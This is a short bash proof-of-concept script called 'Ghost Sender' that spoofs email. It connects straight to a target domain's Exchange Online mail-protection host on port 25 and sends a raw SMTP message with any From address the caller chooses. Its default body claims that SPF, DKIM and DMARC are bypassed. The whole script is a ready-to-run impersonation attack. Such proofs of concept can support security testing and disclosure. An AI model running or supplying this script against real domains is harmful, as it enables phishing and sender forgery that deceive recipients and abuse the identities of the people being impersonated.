#!/bin/bash
# Ghost Sender — Single email PoC
# Usage: ./send.sh <domain> <from> <to> [subject] [body]

DOMAIN="${1:?Usage: $0 <domain> <from> <to> [subject] [body]}"
FROM="${2:?Missing from address}"
TO="${3:?Missing to address}"
SUBJECT="${4:-Ghost Sender PoC}"
BODY="${5:-SPF/DKIM/DMARC bypassed via direct Exchange Online delivery.}"

HOST="${DOMAIN//./-}.mail.protection.outlook.com"

echo "Target: $HOST:25"
echo "From:   $FROM"
echo "To:     $TO"

{ echo "EHLO x"
  echo "MAIL FROM:<$FROM>"
  echo "RCPT TO:<$TO>"
  echo "DATA"
  echo "From: $FROM"
  echo "To: $TO"
  echo "Subject: $SUBJECT"
  echo ""
  echo "$BODY"
  echo "."
  echo "QUIT"
  sleep 2
} | openssl s_client -connect "$HOST":25 -starttls smtp -crlf -quiet 2>/dev/null
